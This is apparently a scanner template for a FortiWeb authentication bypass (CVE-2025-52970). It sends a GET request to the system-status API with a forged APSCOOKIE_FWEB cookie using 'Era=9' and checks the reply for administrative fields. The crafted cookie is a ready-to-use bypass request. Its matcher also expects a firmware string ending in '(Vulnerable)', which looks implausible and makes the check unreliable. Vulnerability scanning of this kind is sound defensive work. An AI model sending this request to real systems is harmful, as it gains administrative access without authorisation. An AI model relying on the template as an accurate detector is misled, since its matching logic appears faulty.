id: CVE-2025-52970

info:
  name: FortiWeb Authentication Bypass (CVE-2025-52970)
  author: IntelEars
  severity: high
  description: |
    FortiWeb is vulnerable to an authentication bypass due to flawed cookie parsing.
    By abusing the `Era=9` parameter inside the APSCOOKIE_FWEB cookie, an attacker
    can trick the server into returning administrative system status without authentication.
  reference:
    - https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970
  tags: cve,cve2025,fortinet,auth-bypass

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/v2.0/system/status.systemstatus"

    headers:
      Cookie: "APSCOOKIE_FWEB_8672793038565212270=Era=9&Payload=test&AuthHash=test"

    matchers:
      - type: regex
        part: body
        regex:
          - '"administrativeDomain":\s*"Enabled"'
          - '"firmwareVersion":\s*"FortiWeb-VM 7\.6\.1 \(Vulnerable\)"'
        condition: and
